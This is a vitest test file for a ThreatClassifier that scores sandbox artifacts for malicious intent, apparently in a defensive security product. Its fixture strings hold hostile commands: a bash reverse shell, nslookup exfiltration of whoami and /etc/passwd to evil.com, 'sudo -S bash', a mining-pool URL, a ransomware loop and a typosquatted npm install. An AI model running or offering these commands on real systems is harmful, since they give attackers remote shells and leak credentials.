import { describe, it, expect } from 'vitest';
import { ThreatClassifier } from './threat-classifier.js';
import type { SandboxArtifact } from './types.js';
import type { ScanFinding } from '@secureyeoman/shared';
import { randomUUID } from 'node:crypto';

function makeArtifact(content: string): SandboxArtifact {
  return {
    id: randomUUID(),
    type: 'text/plain',
    content,
    sourceContext: 'test',
    sizeBytes: Buffer.byteLength(content),
  };
}

function makeFinding(severity: ScanFinding['severity'] = 'medium'): ScanFinding {
  return {
    id: randomUUID(),
    scanner: 'test',
    severity,
    category: 'test',
    message: 'Test finding',
  };
}

describe('ThreatClassifier', () => {
  const classifier = new ThreatClassifier();

  it('classifies benign content with low score', () => {
    const result = classifier.classify(
      [makeFinding('info')],
      makeArtifact('console.log("hello world")')
    );
    expect(result.intentScore).toBeLessThan(0.2);
    expect(result.classification).toBe('benign');
    expect(result.escalationTier).toBe('tier1_log');
  });

  it('classifies reverse shell as malicious', () => {
    const result = classifier.classify(
      [makeFinding('critical')],
      makeArtifact('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1')
    );
    expect(result.intentScore).toBeGreaterThan(0.5);
    expect(['likely_malicious', 'malicious']).toContain(result.classification);
    expect(result.matchedPatterns.length).toBeGreaterThan(0);
  });

  it('detects stratum mining protocol', () => {
    const result = classifier.classify(
      [makeFinding('high')],
      makeArtifact('connect("stratum+tcp://pool.mining.com:3333")')
    );
    expect(result.matchedPatterns).toContain('threat-miner-stratum');
    expect(result.killChainStages).toContain('actions_on_objectives');
  });

  it('detects ransomware patterns', () => {
    const result = classifier.classify(
      [makeFinding('critical')],
      makeArtifact('files.forEach(f => { encrypt(f); rename(f, f + ".encrypted"); })')
    );
    expect(result.matchedPatterns.some((p) => p.includes('ransom'))).toBe(true);
  });

  it('amplifies score for co-occurring patterns', () => {
    // Reverse shell + DNS exfil co-occurrence
    const shellOnly = classifier.classify(
      [makeFinding('critical')],
      makeArtifact('bash -i >& /dev/tcp/10.0.0.1/4444')
    );

    const shellPlusDns = classifier.classify(
      [makeFinding('critical')],
      makeArtifact('bash -i >& /dev/tcp/10.0.0.1/4444\nnslookup $(whoami).evil.com')
    );

    // Co-occurrence should produce higher or equal score
    expect(shellPlusDns.intentScore).toBeGreaterThanOrEqual(shellOnly.intentScore);
  });

  it('weights findings by severity', () => {
    const lowResult = classifier.classify([makeFinding('low')], makeArtifact('safe content'));
    const criticalResult = classifier.classify(
      [makeFinding('critical')],
      makeArtifact('safe content')
    );
    expect(criticalResult.intentScore).toBeGreaterThan(lowResult.intentScore);
  });

  it('returns all matched kill chain stages', () => {
    const result = classifier.classify(
      [makeFinding('critical')],
      makeArtifact('bash -i >& /dev/tcp/10.0.0.1/4444\nnpm install lodahs')
    );
    // Should have both c2 (reverse shell) and delivery (typosquat)
    expect(result.killChainStages.length).toBeGreaterThanOrEqual(1);
  });

  it('returns tier1_log for benign', () => {
    const result = classifier.classify([makeFinding('info')], makeArtifact('const x = 1;'));
    expect(result.escalationTier).toBe('tier1_log');
  });

  it('returns tier4_revoke for malicious', () => {
    const result = classifier.classify(
      [makeFinding('critical'), makeFinding('critical'), makeFinding('critical')],
      makeArtifact(
        'bash -i >& /dev/tcp/10.0.0.1/4444\nnslookup $(cat /etc/passwd).evil.com\nsudo -S bash'
      )
    );
    expect(['tier3_suspend', 'tier4_revoke']).toContain(result.escalationTier);
  });

  it('generates a summary string', () => {
    const result = classifier.classify(
      [makeFinding('high')],
      makeArtifact('stratum+tcp://pool.example.com')
    );
    expect(result.summary).toContain('Classification:');
    expect(result.summary.length).toBeGreaterThan(10);
  });

  it('handles empty findings', () => {
    const result = classifier.classify([], makeArtifact('stratum+tcp://pool.example.com'));
    // Still detects patterns even without findings
    expect(result.matchedPatterns.length).toBeGreaterThan(0);
  });

  it('clamps intent score to 1.0', () => {
    // Multiple high-weight patterns co-occurring
    const result = classifier.classify(
      Array.from({ length: 10 }, () => makeFinding('critical')),
      makeArtifact(
        'bash -i >& /dev/tcp/10.0.0.1/4444\n' +
          'nslookup $(whoami).evil.com\n' +
          'sudo -S bash\n' +
          'stratum+tcp://pool.com\n' +
          '.encrypted\n' +
          'README_RECOVERY.txt'
      )
    );
    expect(result.intentScore).toBeLessThanOrEqual(1.0);
  });

  it('accepts additional custom patterns', () => {
    const custom = new ThreatClassifier([
      {
        id: 'custom-test',
        name: 'Custom test',
        category: 'custom',
        description: 'Test pattern',
        killChainStage: 'reconnaissance',
        indicators: [/CUSTOM_MARKER/],
        intentWeight: 0.5,
        version: '1.0.0',
      },
    ]);
    const result = custom.classify(
      [makeFinding('medium')],
      makeArtifact('detected CUSTOM_MARKER here')
    );
    expect(result.matchedPatterns).toContain('custom-test');
  });

  it('returns empty patterns for clean content', () => {
    const result = classifier.classify(
      [makeFinding('low')],
      makeArtifact('function add(a, b) { return a + b; }')
    );
    expect(result.matchedPatterns).toEqual([]);
    expect(result.killChainStages).toEqual([]);
  });
});
